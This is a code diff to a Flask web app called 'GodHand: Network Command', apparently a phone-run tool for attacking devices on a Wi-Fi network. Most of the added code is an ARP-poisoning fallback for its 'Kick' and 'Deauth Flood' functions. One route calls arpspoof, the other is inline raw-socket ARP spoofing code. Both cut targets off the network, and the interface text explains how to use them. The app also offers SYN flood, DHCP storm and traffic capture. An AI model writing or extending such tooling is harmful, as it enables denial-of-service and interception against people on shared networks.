@@ -159,7 +159,20 @@ def require_auth(f):
 
 app = Flask(__name__)
 
-# ---------- login (opt-in: only enforced when GODHAND_PASSWORD is set) ----------
+@app.after_request
+def add_no_cache_headers(response):
+    # This app's login gate lives entirely in the HTML/JS served by GET / --
+    # if a mobile browser (or a carrier/ISP transparent caching proxy, which is
+    # common on cellular data) ever caches that page, a phone can keep loading
+    # a stale pre-login copy indefinitely and never see the gate at all, no
+    # matter how correct the server-side logic is. Every response, not just /,
+    # is marked uncacheable so there is no path to a stale copy of any of it.
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
+    return response
+
+# ---------- login (mandatory: a password always exists, see AUTO_GENERATED_PASSWORD above) ----------
 @app.route('/api/login_required', methods=['GET'])
 def api_login_required():
     # True whenever require_auth would actually gate a request -- keeps this in
@@ -895,6 +908,8 @@ def deauth_capability(iface):
         return {'method': 'native', 'iface_type': iface_type, 'ap_station_count': len(list_ap_stations(iface))}
     if check_monitor_support(iface):
         return {'method': 'monitor', 'iface_type': iface_type}
+    if get_state('gateway'):
+        return {'method': 'arp_fallback', 'iface_type': iface_type}
     return {'method': 'unavailable', 'iface_type': iface_type}
 
 # ---------- checksum helpers ----------
@@ -1018,13 +1033,20 @@ def start_attack_deauth_native(targets, iface):
     threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
     return [proc]
 
-def start_attack_deauth(targets, iface):
+def start_attack_deauth(targets, gateway, iface):
     add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
     if get_iface_type(iface) == 'AP':
         return start_attack_deauth_native(targets, iface)
     # First check if monitor mode is supported
     if not check_monitor_support(iface):
-        raise RuntimeError('Monitor mode is not supported on this interface. Deauth attack requires monitor mode and a compatible wireless adapter.')
+        # No monitor mode/injection means no real 802.11 deauth is possible from
+        # client mode -- true of essentially every stock Android Wi-Fi chipset.
+        # Fall back to the sustained ARP-poison technique (same as ARP Freeze):
+        # it achieves the same practical outcome, cutting the targets off the
+        # network, via a mechanism that works on any hardware, though it's a
+        # network-layer disconnect rather than a real 802.11 deauth.
+        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to ARP-based disconnection instead of a true 802.11 deauth')
+        return start_attack_arp_freeze(targets, gateway, iface)
     if not set_monitor(iface, True, raise_on_fail=True):
         raise RuntimeError('Failed to enable monitor mode')
     pids = []
@@ -1379,7 +1401,7 @@ def run_attack(weapon_id, targets, gateway, port, iface):
     if weapon_id == 1:
         return start_attack_arp_freeze(targets, gateway, iface)
     elif weapon_id == 2:
-        return start_attack_deauth(targets, iface)
+        return start_attack_deauth(targets, gateway, iface)
     elif weapon_id == 3:
         return start_attack_syn_flood(targets, port, iface)
     elif weapon_id == 4:
@@ -1452,6 +1474,66 @@ def kill_attack(pids):
                 pass
 
 # ---------- kick & block with verification ----------
+def arp_kick_burst(ip, gateway, iface, duration=6):
+    """Bounded ARP-poison burst: the fallback kick for the common case on stock
+    Android Wi-Fi hardware -- client mode, no monitor mode/injection support at
+    all in the driver. This is a network-layer disconnect (the target stays
+    associated to the AP at the 802.11 level but can't reach anything through
+    it), not a real deauth, and it is less durable than one: nothing stops the
+    target from working again the instant the burst ends, whereas a real
+    deauth forces an actual re-association. It is, however, the one technique
+    that works from ordinary client mode with no special hardware or root
+    beyond what raw sockets already need -- the same mechanism ARP Freeze uses.
+    """
+    if not gateway:
+        raise RuntimeError('Gateway not set -- required for the ARP-based kick fallback.')
+    if ensure_tool('arpspoof', 'dsniff'):
+        procs = [
+            subprocess.Popen(['arpspoof', '-i', iface, '-t', ip, gateway], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
+            subprocess.Popen(['arpspoof', '-i', iface, '-t', gateway, ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
+        ]
+        time.sleep(duration)
+        for p in procs:
+            p.terminate()
+        for p in procs:
+            try:
+                p.wait(timeout=2)
+            except Exception:
+                p.kill()
+        return
+    fake_mac = '02:00:00:00:00:01'
+    script = textwrap.dedent(f"""
+        import socket, struct, time
+        IFACE = '{iface}'
+        GATEWAY = '{gateway}'
+        TARGET = '{ip}'
+        FAKE = bytes.fromhex('{fake_mac.replace(':', '')}')
+        def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
+            eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
+            arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
+            arp += src_mac + socket.inet_aton(src_ip)
+            arp += dst_mac + socket.inet_aton(dst_ip)
+            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+            s.bind((IFACE, 0))
+            s.send(eth + arp)
+            s.close()
+        end = time.time() + {duration}
+        while time.time() < end:
+            send_arp(2, GATEWAY, TARGET, FAKE, b'\\xff'*6)
+            send_arp(2, TARGET, GATEWAY, FAKE, b'\\xff'*6)
+            time.sleep(0.3)
+    """)
+    fd, path = tempfile.mkstemp(suffix='.py')
+    os.close(fd)
+    with open(path, 'w') as f:
+        f.write(script)
+    try:
+        res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=duration + 5)
+        if res.returncode != 0:
+            raise RuntimeError('ARP-based kick fallback failed: ' + res.stderr.decode(errors='ignore')[-300:])
+    finally:
+        os.unlink(path)
+
 def kick_client(ip, mac, iface):
     add_log('info', f'Attempting to kick {ip} ({mac})')
     iface_type = get_iface_type(iface)
@@ -1475,7 +1557,21 @@ def kick_client(ip, mac, iface):
         return True
 
     if not check_monitor_support(iface):
-        raise RuntimeError('Monitor mode is not supported on this interface.')
+        # Stock Android Wi-Fi chipsets essentially never expose monitor mode/frame
+        # injection to mac80211 -- there is no software trick that makes a real
+        # 802.11 deauth possible here. Fall back to the one technique that does
+        # work from ordinary client mode: a bounded ARP-poison burst that cuts
+        # the target's network access for a few seconds, same mechanism ARP
+        # Freeze uses. Clearly labeled as a fallback, not silently substituted.
+        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to a brief ARP-based disconnect for {mac}, not a true 802.11 deauth')
+        arp_kick_burst(ip, STATE['gateway'], iface)
+        time.sleep(1)
+        reachable = server_ping(ip, timeout=1)
+        if reachable:
+            add_log('warn', f'Target {ip} is still responding to ping after the ARP-based kick')
+            return False
+        add_log('success', f'Target {ip} is not responding to ping after the ARP-based kick')
+        return True
     if not set_monitor(iface, True, raise_on_fail=True):
         raise RuntimeError('Cannot enable monitor mode')
     if ensure_tool('aireplay-ng', 'aircrack-ng'):
@@ -1565,6 +1661,9 @@ def index():
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <title>GodHand: Network Command</title>
 <style>
 :root {
@@ -2313,6 +2412,9 @@ nav button .icon svg { display: block; }
 
 <main>
   <div id="tab-settings" class="tab-content active">
+    <div id="root-warning" class="status-message" style="display:none; border-left-color:var(--danger);">
+      <strong>Not running as root.</strong> Recon scanning, ARP Freeze, Deauth Flood, SYN Flood, DHCP Storm, and Traffic Capture all need raw sockets (and <code>iw</code>/<code>iptables</code> for some), which require root. Run this with <code>sudo</code> (or as root in Termux) or these will fail.
+    </div>
     <div class="card">
       <h2>Interface & gateway</h2>
       <p class="sub">Start here — set your Wi‑Fi interface and gateway IP before scanning or attacking.</p>
@@ -3180,6 +3282,10 @@ async function checkPrerequisites() {
     const s = state.state;
     document.getElementById('settings-status').textContent =
       `Current: IFACE: ${s.interface || 'none'}, GW: ${s.gateway || 'none'}, PORT: ${s.port}`;
+    const rootWarning = document.getElementById('root-warning');
+    if (rootWarning) {
+      rootWarning.style.display = state.is_root ? 'none' : 'block';
+    }
   } catch(e) {}
 }
 
@@ -3232,8 +3338,10 @@ async function refreshDeauthCapability() {
       box.innerHTML = `<span class="badge success">Native</span> ${res.iface_type} interface is your own access point — Kick / Deauth Flood use the kernel's station-del, no monitor mode. ${res.ap_station_count} station(s) currently associated.`;
     } else if (res.method === 'monitor') {
       box.innerHTML = `<span class="badge warning">Monitor mode</span> Interface is ${res.iface_type} — Kick / Deauth Flood will switch it to monitor mode and use frame injection.`;
+    } else if (res.method === 'arp_fallback') {
+      box.innerHTML = `<span class="badge warning">ARP fallback</span> ${res.iface_type} interface has no monitor mode/injection support (typical for a phone's built-in Wi-Fi) — Kick / Deauth Flood will fall back to ARP-based disconnection instead. This cuts network access rather than sending a true 802.11 deauth frame, and is less durable.`;
     } else {
-      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type} and doesn't support monitor mode — Kick / Deauth Flood can't function on this hardware.`;
+      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type}, doesn't support monitor mode, and no gateway is set for the ARP-based fallback — Kick / Deauth Flood can't function yet. Set a gateway on the Settings tab.`;
     }
   } catch(e) {}
 }
@@ -3828,6 +3936,7 @@ def api_state():
             },
             'running_attacks': list(STATE['attack_pids'].keys()),
             'auth_enabled': bool(SECRET or LOGIN_PASSWORD),
+            'is_root': os.geteuid() == 0,
         })
 
 @app.route('/api/scan', methods=['GET'])
